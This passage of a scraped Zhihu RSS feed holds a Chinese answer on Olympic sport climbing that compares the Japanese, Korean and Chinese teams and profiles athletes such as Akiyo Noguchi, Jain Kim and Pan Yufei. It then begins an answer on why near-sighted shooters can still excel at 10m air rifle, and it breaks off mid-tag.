Seo也加强巩固了自己的抱石水平。</p>\n<p>今明天将是男子组和女子组的决赛，祝大家观赛愉快，享受比赛。</p>\n<hr>\n<p>攀岩项目首次进入了奥运，一众岩友的很多回答已经说到了攀岩的方方面面。攀岩首次入奥，中国国家队也是首次建立了一支优秀的攀岩队伍。这支国家队新队伍的诞生引起了我的关注。</p>\n<p>我就稍微聊聊选手，特别是着重聊一下中日韩三国的选手吧。</p>\n<p>中日韩三国在体坛也算相爱相杀多年，并且横跨多个体育项目，足球，篮球，排球，乒乓球，游泳，围棋，并且出现了很多个口口相传的动人故事。现在运动攀岩也进入了奥运大家庭，也算是为这三个国家之前的体育项目比拼又增添的新的一笔。</p>\n<p>笔者个人认为，在现在的攀岩大环境下，中日韩三国之间的关系跟早年的围棋大环境有相似之处：日本实力统治，韩国正在悄悄开始新时代，而中国目前无疑是三个国家中相对较弱的国家，但是前景无疑是光明的…</p>\n<p>先从最强大的日本开始说起。</p>\n<p><b>日本队 </b></p>\n<p><b>关键词：内卷</b></p>\n<p>提起日本队，笔者第一个会想到的是一个最近开始很流行的词语——内卷。</p>\n<p>日本队无疑是全亚洲，乃至于全世界，综合攀岩实力最强的国家。</p>\n<p>日本队有多强？我们用2019年国际攀联世界杯的各个分站赛数据来说话。为什么选用2019年？是因为2019年的时候攀岩在奥运会的比赛方式已经确定（综合），以及各位选手在2019国际攀联世界杯的积分将会被作为奥运资格的选拔方式之一，所以全世界的所有攀岩选手对2019年国际攀联世界杯都非常重视，而且在2019年，在日本的八王子分站赛，第一次出现了按照奥运会标准的综合比赛方式。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛男子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0787fa3caba4cc402ecb346ab76c7f9c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"662\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-0787fa3caba4cc402ecb346ab76c7f9c\" data-watermark-src=\"v2-63bc8a1d1ce147513cdefda09c428f54\" data-private-watermark-src=\"v2-acf6b6226900ce3763b9067ef1f86e42\"></p>\n<p>可以看到，除了德国慕尼黑站日本队稍显拉垮，没有成员进入前六以外，有两次分站赛有两人进入决赛，有两次分站赛有三人进入决赛，有两次分站赛有四人进入决赛，这个数目放眼任何一个国家都是统治级的。七次有三次冠军落入日本队手中。其中的两次冠军，由目前的日本男子第一人，外号“日本一哥”的Tomoa Nagasaki的获得。</p>\n<p>下图是2019年国际攀联世界杯抱石比赛女子组各个分站赛的决赛成员，按照最终名次排列，其中标有绿色的是日本队选手：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d3bc4372fbb74528aa2106f36879e46a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"736\" data-watermark=\"watermark\" data-original-src=\"v2-d3bc4372fbb74528aa2106f36879e46a\" data-watermark-src=\"v2-8262650633aaacd31ef707da0ba7e08b\" data-private-watermark-src=\"v2-365ae70b09e30b66a2ab560dffa5364c\"></p>\n<p>相比男子组，女子组的统治力也并没有逊色，只是由于2019年是斯洛文尼亚选手Janja Garnbret状态爆炸的一年，日本女队难夺一冠。一直被Janja压制的这位日本选手，正是老来焕发第二春，状态更胜壮年的日本女子第一人，Akiyo Noguchi。</p>\n<p>相比抱石被日本队统治，先锋和速度攀岩相对百花齐放一些。那么，综合这三项考核的攀岩比赛，日本队会不会因此受到影响呢？</p>\n<p>结论是…是的，日本队受到了影响，统治力更加强大了。以下是八王子站综合排名：</p>\n<p>男子组：</p>\n<p>冠军归属日本，前六名四位日本选手。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-e82d31bb2d8c1d3729336f9a55d3ffed_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1269\" data-rawheight=\"363\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>女子组：</p>\n<p>最好成绩亚军，前六名三位日本选手。 </p>\n<p>所以在攀岩界，有着世界对抗日本的传说…</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8342ad202823b2e9c6e2b927fb85b8a8_720w.jpg?rss\" data-caption=\"网上的调侃世界对抗日本的攀岩表情包\" data-size=\"normal\" data-rawwidth=\"929\" data-rawheight=\"495\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>那么，为什么我要用内卷来形容日本队呢？</p>\n<p>那是因为攀岩奥运名额的问题。由于奥运攀岩比赛的选手人数只有男女各二十人，为了防止一边倒的局面，世界攀联规定，每个国家的名额上限，至多两男两女一共四位选手。</p>\n<p>由于Tomoa和Akiyo在2019年国际攀联世界杯的优异表现，他们各自锁定了一个奥运名额</p>\n<p>由于日本队是东道主，所以还能自动获得一男一女两个名额——事实上，我觉得日本队并不需要东道主这个便利，凭借接下来两位选手（男生Kai Harada和女生Miho Nonaka）的优异表现，也照样能够顺延获得两个奥运名额。</p>\n<p>然而，剩下的一众日本选手，尽管他们的实力可能还强于不少获得奥运资格的其他国家的一些选手，但是因为名额限制，只能遗憾无缘这次奥运。可以说，许多出色的日本攀岩选手们，有着和许多出色的中国乒乓球选手们，有着相似的痛苦。这次疫情之后，日本先于其他国家办起了国内锦标赛，由于比赛荒，日本锦标赛获得了全世界岩友们的空前关注。比赛水平之高，颇有几分我国乒乓球「直通里约热内卢」之类比赛的即视感。</p>\n<p>下面介绍一下一些日本选手：</p>\n<p>奥运选手：Akiyo Noguchi</p>\n<p>这次攀岩入奥，正好赶上了东京奥运会。在当年，得知攀岩有机会加入2020年奥运会之时，当仁不让日本的女子攀岩第一人，Akiyo Noguchi，积极参与了东京申奥的活动。Akiyo其实相对于攀岩选手来说，年纪已经不算轻，她之前也有过2020年之前就退役的打算。但是，在活动中她表示，只要东京获得了2020年奥运会的承办资格，她肯定会积极训练，备战2020东京奥运，在为国效力之后再退役。随着东京申办奥运的成功，Akiyo也实现了自己的梦想。在2018年开始的一系列比赛之中，Akiyo状态爆炸，不仅实现了第二春，并且成绩更胜往昔。早年Akiyo是以柔韧著称，经常出现脚比头高的极限挂脚动作，然而到了职业生涯末期，Akiyo进一步雕琢自己的风格，在动态动作方面取得了长足进步，从动态来说已经是稳稳的世界顶尖水准。然而疫情的降临，让东京奥运推迟至2021年，Akiyo的年龄也来到了31岁，在疫情后的比赛已经出现了明显的状态下滑，不禁让人唏嘘。希望她能够保持状态，能够在奥运比赛中取得理想的成绩。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2004f98c02e63c19d3bb47b02b015893_720w.jpg?rss\" data-caption=\"日本一姐Akiyo Noguchi在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"499\" data-watermark=\"watermark\" data-original-src=\"v2-2004f98c02e63c19d3bb47b02b015893\" data-watermark-src=\"v2-190d0b644211b55f1fa6fa91119df678\" data-private-watermark-src=\"v2-886f72bec4cb1719ef50b87a2e124927\"></p>\n<p>奥运选手：Tomoa Naarasaki</p>\n<p>日本一哥，动态之王，能够跳的时候绝对不静态，已经形成了自己鲜明的风格。其实Tomoa在户外攀岩的时候，其静态动作也是非常精准的，只是在竞技攀岩中，他选择了使用动态方法来完成而已。攀岩的先锋比赛有六分钟的时间限制，但是Tomoa无论能不能把线路爬完，基本上花费的时间都在三分钟以内，人狠话不多。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4d00f33f0012a46c56e20d6c9d2c2424_720w.jpg?rss\" data-caption=\"Tomoa Naarasaki登顶后的标志性动作。图源：Japan Times\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1315\" data-watermark=\"watermark\" data-original-src=\"v2-4d00f33f0012a46c56e20d6c9d2c2424\" data-watermark-src=\"v2-cae801cafd39781888cc01e6bc11ee8e\" data-private-watermark-src=\"v2-c07c7fb8e0a18879f379181427c311ae\"></p>\n<p>奥运选手：Miho Nonaka</p>\n<p>Miho是当仁不让的日本女子攀岩第二人，跟Akiyo颇有一种「既生瑜，何生亮」的味道。除了在2018年世界攀联锦标赛拿了年度世界冠军（Akiyo是年度世界亚军），其余时候基本上是被Akiyo稳压一头（就连2018年也是拿了无数亚军屈居Akiyo之后在某一次比赛绝地翻盘）。坊间传言Miho和Akiyo，以及一些其他日本队成员的关系并没有很好，这点笔者没有特意求证，但是相比于日本队其他选手的其乐融融，Miho颇有种苦大愁深的味道，训练刻苦，甚至还号召日本民众给自己众筹了一个私人的速度攀岩赛道。相比其他选手Miho经常在Instagram发自己的训练视频，并且经常给自己打鸡血，灌鸡汤，不得不让人瑞斯拜。也希望Miho的努力能够取得回报。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-2fcb9fbd06b4828bcd59ebcfcbbaafda_720w.jpg?rss\" data-caption=\"Miho Nonaka在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"463\" data-watermark=\"watermark\" data-original-src=\"v2-2fcb9fbd06b4828bcd59ebcfcbbaafda\" data-watermark-src=\"v2-ce96197fd0e3b257b3a7bbda6a06c6d0\" data-private-watermark-src=\"v2-06d4b7804cd10a398bec0a35cc653bca\"></p>\n<p>奥运遗珠：Futaba Ito</p>\n<p>Futaba是一位青少年选手——今年不过19岁。笔者从她16岁就开始关注了，是一位非常可爱的小姑娘。她一直是Akiyo的小跟班，其实也算是Akiyo的徒弟。相比Akiyo和Miho，Futaba多多少少有些稚气未脱，发挥时好时坏，在总成绩上比两位一姐二姐还是略显逊色。但是这两年随着成年，Futaba的力量也有了很大增长，整个人看上去大了一圈。等到Akiyo退役，相信Futaba通过也可以顺势上位，和Miho稳坐日本女队前两把交椅。不过日本年轻一代好手太多，也可能随着Akiyo的退役进入群雄割据的时代，未来如何就看Futaba自己的努力了。</p>\n<p><b>韩国队</b></p>\n<p><b>关键词：传承</b></p>\n<p>虽然比不上日本队可以对抗世界，但是韩国队绝对是亚洲范围乃至世界范围内的一支劲旅。其中有一个原因，是韩国队拥有全世界竞技攀岩第一人，或者说，世界攀联锦标赛成绩第一人，Jain Kim。是的，笔者在这里用了第一人这个词，并且没有加之一，没有限定性别。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2fd41eb66bb1344dc65fd8ba0e9239ac_720w.jpg?rss\" data-caption=\"最优雅的岩者之一，Jain Kim。图源：ifsc\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1638\" data-watermark=\"watermark\" data-original-src=\"v2-2fd41eb66bb1344dc65fd8ba0e9239ac\" data-watermark-src=\"v2-df376e60a73fba5a0c4454a3f0765391\" data-private-watermark-src=\"v2-4123e466184d054709a8b39646d45a2b\"></p>\n<p>Jain Kim在国际攀联世界杯共获得过多达三十次分站赛冠军，并且积分在2009年至2018之内从来没有掉出过世界前三，在2019/2013/2014获得过先锋攀登年度总冠军，在2010年和2015年获得过年度综合总冠军。这些成绩或许在未来会被人超越，比如Adam Ondra或者Janja Garnbret（时尚上Janja已经拥有了更多年度综合总冠军，但是在分站赛冠军数量上远远够不上Jain的级别。），但至少在目前Jain的成绩还是独霸天下。</p>\n<p>除开成绩这些冰冷的数字本身，Jain更为大家所知的，是她的攀爬技巧。几乎所有的岩友在刚开始接触攀岩的时候，都或多或少被告知要看Jain Kim的视频学习。Jain Kim技术动作丰富，攀爬节奏行云流水，脚点放置和手点抓握精准，无论从哪个角度来看都是教科书一般的存在，非常适合新手的学习。</p>\n<p>Jain和Akiyo同岁，在世界赛场上互相较量多年。早年Jain一直压制着Akiyo，直到近年来Akiyo开发出动态，以及世界比赛抱石定线风格越来越偏向跑酷风以后，Jain的风头才渐渐褪去。即便如此，在先锋攀登的比赛中，Jain仍然是稳定的决赛圈选手，并且还是可以力压群雄拿下冠军。只是Jain本身的风格并不动态，在现在的抱石比赛中非常吃亏，有的时候连半决赛都只能勉强进入，所以一定程度拖累了综合成绩。</p>\n<p>Jain也有奥运梦想，在年度积分上没有优势的她，决定冲击一下2020年亚洲锦标赛，因为2020年亚洲锦标赛的冠军还是可以获得一个奥运名额。然而造化弄人，因为新冠疫情，2020年亚洲锦标赛不得不取消，由于时间紧急，世界攀联选择了顺沿积分最高的选手递补，Jain遗憾无缘奥运。可喜的是，Jain在奥运希望破灭之后选择了和自己结婚多年的老公要了一个孩子，今年刚刚出生，一家人共享天伦之乐。笔者还是真诚地希望以后能在国际赛场上见到Jain，但是如果Jain就此退役，对她的人生也未必不是一件好事。</p>\n<p>有趣的是，世界攀联顺沿递补的一男一女两个奥运名额，都落在了韩国选手的囊中——男选手是Jong-won Chon，女选手则是Chae-hyun Seo。</p>\n<p>Chae-hyun Seo今年才十七岁，刚出道时被誉为韩国天才少女，而且她从小是看着Jain的比赛长大的，并且拥有一个叫“小Jain Kim”的外号。两人是忘年之交，也经常一起训练，Jain甚至也在第一时间把自己怀孕的消息跟Chae-hyun分享。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5f884e7e75c1af6486c4bd8b66dfe225_720w.jpg?rss\" data-caption=\"Chae-hyun Seo在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"457\" data-watermark=\"watermark\" data-original-src=\"v2-5f884e7e75c1af6486c4bd8b66dfe225\" data-watermark-src=\"v2-be9623cc33efa79c1c2492a22d9ae051\" data-private-watermark-src=\"v2-d592125a0e64349ae65ea672445d1513\"></p>\n<p>Chae-hyun在十四岁的时候拿下了户外5.14d（科罗拉多州的Bad Girls Club）的好成绩，震惊了全世界。在2019年刚刚适龄参加世界攀联锦标赛，就在六次先锋攀登比赛中拿下4金1银1铜的好成绩，力压Janja成为年度的先锋攀登冠军。Chae-hyun和Jain Kim技术风格类似，在抱石比赛中也没有很大优势，想要真正称霸世界还有一段路要走。</p>\n<p>另一名值得一提的韩国选手是男队的Jong-won Chon，同样也获得了奥运名额。相比其他精英男选手，Jong-won Chon本身非常偏瘦，BMI值甚至只有17点几，是营养不良的标准。但是Jong-won Chon最大的优势在于指力强劲，并且在2015年和2017年都拿到过抱石的年度总冠军，近年来也都是抱石比赛决赛圈的常客。笔者深刻怀疑Jong-won属于怎么吃都吃不胖的体型，因为他声称自己最爱吃的就是汉堡，并且称汉堡为“强者的食物”。奥运赛场上，Jong-won的竞争对手有很多，除开两位日本选手以外，捷克之王Adam Ondra无疑也是最大威胁。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-501e5729fef8ba657458d6aa3589a35b_720w.jpg?rss\" data-caption=\"Jong-won Chong在比赛中。可以看出，他的身材非常精瘦。图源：Gettyimages\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"904\" data-watermark=\"watermark\" data-original-src=\"v2-501e5729fef8ba657458d6aa3589a35b\" data-watermark-src=\"v2-36e39e004bc245fad2ab3753fca0c917\" data-private-watermark-src=\"v2-390070b72bf892baa945234c2c7fe5fd\"></p>\n<p>相比韩国女队，韩国男队的后备力量要相对薄弱一些，在韩国全国比赛中，只要Jong-won不打盹，抱石冠军绝对没跑，先锋决赛也是毫无悬念。在培养后继巨星方面，韩国男队还需要努力。</p>\n<p><b>中国队</b></p>\n<p><b>关键词：希望</b></p>\n<p>相比日本和韩国两国，中国队目前的实力无疑是比较薄弱的。这个情况跟往前四五十年的中国围棋情况非常相似：中国向日韩努力学习，尤其日本。</p>\n<p>抱石目前是中国队在国际赛场上最需要提高的一项。和日本队以及韩国队选手经常是世界攀联锦标赛决赛的常客不同，中国队的队员往往需要在预选赛中超水平发挥才可以进入半决赛，然而在半决赛中往往也处于后半梯队，很难争取到一个决赛名额。</p>\n<p>先锋攀登方面，中国队要好一些。攀岩入奥以后，国家开始重视，开始有意培养攀岩选手，攀岩也在人民群众中开始普及，作为地大物博的国家自然有天才少年出现。中国选手在先锋攀登的世界攀联锦标赛中，已经能比较稳定地锁定半决赛名额，而且也能经常在决赛看到我们中国选手的身影。</p>\n<p>下面这个表格是2019年世界攀联锦标赛先锋攀登比赛各个分站赛的决赛成员，包含男女组。其中的两位中国选手我用红色标记出来了。这里日本队仍然是绿色，韩国队使用蓝青色，我们可以再次看到日本队可怕的统治力，以及2019年韩国天才少女Chae-hyun在先锋攀登中的优异表现：</p>\n<p>IFSC Lead Finalist in 2019 - Men &amp; Women </p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c9ff3c27111d54fcda4a678b8659eb0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1105\" data-rawheight=\"587\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在表格里面出现的这两位中国选手，就是我们国家自己的两位天才少年：潘愚非和张悦彤。其中，潘愚非成功拿到了奥运资格，张悦彤由于在预选赛后期遭遇伤病以及新冠疫情改制等原因无缘这次奥运。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4be21644e4af673c6b9d5976a9761aec_720w.jpg?rss\" data-caption=\"潘愚非在比赛中。\" data-size=\"normal\" data-rawwidth=\"1153\" data-rawheight=\"1729\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运选手：潘愚非</p>\n<p>笔者有一位在华南理工上大学的朋友。他在大学期间接触了攀岩，而且学校里就有攀岩馆，氛围非常好。而在攀岩馆内，爬得最好的并不是华南理工校队的成员，而是一位十岁的孩子——这位孩子，就是现在的潘愚非。</p>\n<p>潘愚非开始训练攀岩的理由，其实跟许多岩友有着相似之处。潘愚非从小体质弱，而且并不是很喜欢具有激烈身体对抗的体育活动，因此选择了攀岩。攀岩从来不是岩者跟岩者之间的较量，而永远是岩者跟岩壁之间的较量。潘愚非不断精进自己，改进自己的攀爬技术，补全自己的短板。</p>\n<p>在2017年的国际攀联锦标赛厦门站中，潘愚非就获得了男子先锋攀登的第三名，这是中国队第一次在先锋攀登站上领奖台。而在上图的2019年的国际攀联锦标赛Villars站中，潘愚非更是再一次取得了突破，获得了男子先锋攀登的第二名，并且锁定了一张奥运会入场券。这次奥运因为疫情延期，使得他更有机会能够继续锤炼自己，以求能在奥运赛场上取得更大的突破。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7f7444793dd9a63e0e8d20bc2f900390_720w.jpg?rss\" data-caption=\"张悦彤在比赛中。\" data-size=\"normal\" data-rawwidth=\"1267\" data-rawheight=\"950\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运遗珠：张悦彤</p>\n<p>如果说韩国拥有自己的天才少女Chae-hyun Seo的话，那么我们中国也有自己的天才少女，张悦彤（彤彤）。</p>\n<p>彤彤在深圳出生长大，从小就开始学习攀岩。在2012年开始参加全国青年攀岩锦标赛，就拿下该年龄段的先锋和速度冠军，并且完成四连霸。尽管在国内已经战绩显赫，但是彤彤在2018年才真正站到国际赛场，参加了国际攀联世界青年锦标赛，在16-17岁组获得了抱石比赛第五名，先锋攀登第三名的好成绩，可谓是出道就是高起点，相比Chae-hyu那也不遑多让。接着在2019年彤彤就开始参加了成年组的比赛取得了一次亚军，一次第六名，和一次第七名的好成绩。尽管目前在成绩上相比韩国天才选手Chae-hyun，以及日本小将Natsuki Tanii稍逊，但是未来的路还很长，彤彤的前景也很光明，我们完全有理由相信这三位选手在未来在亚洲和世界赛场上大放异彩，成为中日韩女子攀岩界的一时瑜亮。很有趣的是，这三位女孩子的私交也非常好，可以看到Instagram上她们经常的互相留言点赞。相信随着未来越来越多的世界攀联比赛以及奥运比赛，我们能更多地看到她们一起出现在国际赛场上。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3bb4a10e3c0bcfaa668edd335cf19e08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"597\" data-watermark=\"watermark\" data-original-src=\"v2-3bb4a10e3c0bcfaa668edd335cf19e08\" data-watermark-src=\"v2-3bd063b675312b8de5584fd4c8ff130b\" data-private-watermark-src=\"v2-7966abfc730a45b1d2b76f847d889f62\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-04a1bf0e8229b642e44aa87c76b4e74d_720w.jpg?rss\" data-caption=\"分别是Chae-hyun和彤彤在2019年国际攀联世界杯Briancon站之后的社交媒体截图。两位小姑娘私底下是很好的朋友，经常在社交媒体互动。\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"599\" data-watermark=\"watermark\" data-original-src=\"v2-04a1bf0e8229b642e44aa87c76b4e74d\" data-watermark-src=\"v2-65825b16f90050585a2daa6e71bdba23\" data-private-watermark-src=\"v2-6e9ccb69962552faf569044c35272581\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/liang-wei-93-75?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">梁维</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">146 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/265963316?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问滑板,滑雪跟冲浪这3种运动在学习或者滑行时有什么共同点跟不同点呢？</a><br><a href=\"http://www.zhihu.com/question/20535362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">冲浪运动有哪些需要注意的地方？</a><br>\n","link":"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"奥运神射手许海峰视力不足 0.5，张梦圆近视 600 度，近视也可以练射击吗？他们是如何看清靶子的？","date":"2021-08-04 06:30:10","description":"\n<p>对于射击运动来说，<b>视力远没有多数人想象的那么重要</b>。</p>\n<p>普通人无法看清的靶纸，<b>很多射击运动员同样无法看清</b>。</p>\n<p><br></p>\n<p>因为一来靶纸那么小、距离那么远，已经超过人类视力的极限。最后的结果是，大家都看的不是很清……二来即便存在“千里眼”看得清清楚楚，如果无法做到动作稳定、且心态平静的完成射击，依然无法实现目标。</p>\n<p>毕竟射击向来比的不是谁看的最准，甚至不是比谁射击的技术，而是<b>比谁心理更沉着，动作更「稳」。</b></p>\n<p>——所以射击选手花了大量的时间，都用来训练抗压能力/心理负荷和稳定性。包括所有射击项目用到的道具，射击服、射击鞋等，主要的作用也都是提高稳定性、降低干扰。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c643d3516909f50d1d150d0d3f109ff5_720w.jpg?rss\" data-rawwidth=\"2070\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"面部肌肉颤抖对气步枪射击而言是很要命的\" data-watermark=\"watermark\" data-original-src=\"v2-c643d3516909f50d1d150d0d3f109ff5\" data-watermark-src=\"v2-d22620a066be6bef3d56c20526e96c41\" data-private-watermark-src=\"v2-7912020596079aa8a2371c85c99c22ba\"></p>\n<p><br></p>\n<p>之前和射击队的聊过，其中两点记忆犹新。</p>\n<p>打气步枪射击的，别管平时表情多么搞怪面部动作丰富，射击时<b>控制面部肌肉颤抖的能力</b>相当重要（实际上很多身体的细微动作并不受主观控制，这是与生俱来的天赋）；</p>\n<p>另外别看射击运动员比赛中每个动作那么稳、甚至视觉上动作表现的很程序化很僵化，其实他们的身体动作非常柔和（笨重的射击服也限制了活动），射击运动员在所有奥运运动员里，可能具备最强的<b>姿势模仿能力</b>。</p>\n<p>这个姿势模仿能力，也是选拔潜力小射击运动员的重要标准之一。</p>\n<hr>\n<p>多放一些射击相关的设备和数据，对视力和射击这件事理解就能直观很多。</p>\n<p>也就能明白为什么说，<b>视力其实压根不是决定最终成绩的关键因素。</b></p>\n<p><br></p>\n<p>奥运射击分为两类，固定靶射击（气步枪、气手枪）和飞碟移动靶射击（双管霰弹枪）。固定靶射击里最短距离10米，固定射击位+固定靶纸。</p>\n<p>找了三张十米气步枪比赛的照片，注意距离十米远的靶纸上的黑点（很小）：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a61f8162d4b1bd096dc7942c67860ab5_720w.jpg?rss\" data-rawwidth=\"2068\" data-rawheight=\"1378\" data-size=\"normal\" data-caption=\"今年东京奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a61f8162d4b1bd096dc7942c67860ab5\" data-watermark-src=\"v2-04076c7997de43b7adac7cb13d7977ca\" data-private-watermark-src=\"v2-7885c1609907d9fbbc2c27fa1da5f846\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a4cb5aa17f6632d222c705317c8f7265_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1704\" data-size=\"normal\" data-caption=\"2016年里约奥运的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a4cb5aa17f6632d222c705317c8f7265\" data-watermark-src=\"v2-3c02bed2538609bbf8e492d3681331c5\" data-private-watermark-src=\"v2-5f89e586b5334924063012f4185f2d8d\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9cac32d063d8374716ffab1c95267511_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1549\" data-size=\"normal\" data-caption=\"2000年悉尼奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-9cac32d063d8374716ffab1c95267511\" data-watermark-src=\"v2-8469af387e0691cf35d4df11e2d637b8\" data-private-watermark-src=\"v2-7c6c8ebe760527eea40a0e92334fe7a0\"></p>\n<p><br></p>\n<p>照片里几乎看不清的黑点，长这样：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-eaf94c752fa453778bc1987930996d2c_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-eaf94c752fa453778bc1987930996d2c\" data-watermark-src=\"v2-8a2619bc981a92ee5f9f28bf32242672\" data-private-watermark-src=\"v2-a679d212cca1a4df698389a272e42f22\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4175a56120392ec9877508723ef3af55_720w.jpg?rss\" data-rawwidth=\"1552\" data-rawheight=\"1076\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4175a56120392ec9877508723ef3af55\" data-watermark-src=\"v2-56b2fc38e9976aea65b0218e84a5226c\" data-private-watermark-src=\"v2-0256b89d60a6d5af0f2c05725943228c\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-40b7fe38af87ce013d3e0e91788901fa_720w.jpg?rss\" data-rawwidth=\"1286\" data-rawheight=\"316\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-40b7fe38af87ce013d3e0e91788901fa\" data-watermark-src=\"v2-cf37a8b562b4c4b203cbadafbb293093\" data-private-watermark-src=\"v2-6d8832082ddd19bedcbfd10c7c91d51e\"></p>\n<p>具体尺寸为：</p>\n<blockquote>总直径= 45.5mm； <br>4 环直径=30.5mm；<br>9 环直径=5.5mm； <br>10 环Ø=0.5mm；<br>划线宽度0.1mm至0.2mm</blockquote>\n<p><br></p>\n<p>就这么点大，且那么远。</p>\n<p><b>想要看清靶纸上的7～10环区，对人类的视觉而言几乎就已经是不可能的任务。</b></p>\n<p><b>而想靠眼睛去区分更细微的、能决定选手成绩的*.*环，更是完全天方夜谭。</b></p>\n<p>如果普通人有机会尝试一下10米气步枪射击，能打中靶纸，已经是相当不错的结果了。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-940b24ca888bd0b71925a8532d7c7a31_720w.jpg?rss\" data-rawwidth=\"1442\" data-rawheight=\"964\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-940b24ca888bd0b71925a8532d7c7a31\" data-watermark-src=\"v2-a0f9ebfc3f065605f3c0d5fa133b0cd0\" data-private-watermark-src=\"v2-63d079f33da8abcce3f15b691eec14ac\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-2de532b30c98113a4747581ff6aad381_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"这张仅供参考尺寸\" data-watermark=\"watermark\" data-original-src=\"v2-2de532b30c98113a4747581ff6aad381\" data-watermark-src=\"v2-ebb5e1269be41afeba9df52198af1c70\" data-private-watermark-src=\"v2-ce53ad360730d4edb0d7eb7f783a7a40\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-12f29d42fea4a50e6ffa1eff3e3f24a6_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"和奥运会使用的靶纸较为类似的装置。通过滚轴更换单次射击的靶纸。\" data-watermark=\"watermark\" data-original-src=\"v2-12f29d42fea4a50e6ffa1eff3e3f24a6\" data-watermark-src=\"v2-fcd2d8ae4234b037679cf38d7c50174c\" data-private-watermark-src=\"v2-0b8fbb17806fdc12eda7ffb7aef8f44b\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4c918094ff8d050c877ffcd3f5c60dd8_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"932\" data-size=\"normal\" data-caption=\"相比之下，气手枪的靶纸就要比气步枪大得多。二者在射击器材、射击方式的精准性和稳定性上也有明显的差异\" data-watermark=\"watermark\" 